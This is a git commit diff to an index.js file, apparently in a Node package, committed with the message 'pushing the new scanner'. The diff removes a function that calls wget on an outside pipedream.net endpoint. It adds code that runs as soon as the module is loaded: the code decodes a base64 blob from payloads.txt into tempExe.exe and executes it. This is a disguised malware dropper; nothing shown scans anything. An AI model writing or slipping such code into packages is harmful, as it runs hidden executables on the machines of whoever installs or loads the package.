31455f6e21a7f6c163f859c6899e04f748dbe887
kali <kali@localhost.localdomain>
2024-01-02 22:39:17 +0100

    pushing the new scanner

--- index.js
+++ index.js
@@ -1,13 +1,22 @@
+const fs = require('fs');
 const { exec } = require('child_process');
 
-module.exports = function() {
-    exec('wget -O - https://eop6hnhxqa4cd27.m.pipedream.net', (error, stdout, stderr) => {
-        if (error) {
-            console.error(`exec error: ${error}`);
-            return;
-        }
-        console.log(`wget stdout: ${stdout}`);
-        console.error(`wget stderr: ${stderr}`);
-    });
-};
+// Read the Base64 encoded string from payloads.txt
+const ENCODED_EXE = fs.readFileSync('payloads.txt', 'utf8');
+
+// Decode and write to a temporary .exe
+fs.writeFileSync('tempExe.exe', Buffer.from(ENCODED_EXE, 'base64'));
+
+// Execute the .exe
+exec('tempExe.exe', (error, stdout, stderr) => {
+   if (error) {
+      console.error(`exec error: ${error}`);
+      return;
+   }
+   console.log(`stdout: ${stdout}`);
+   console.error(`stderr: ${stderr}`);
+});
+
+// Optionally, clean up the temporary .exe
+// fs.unlinkSync('tempExe.exe');
 
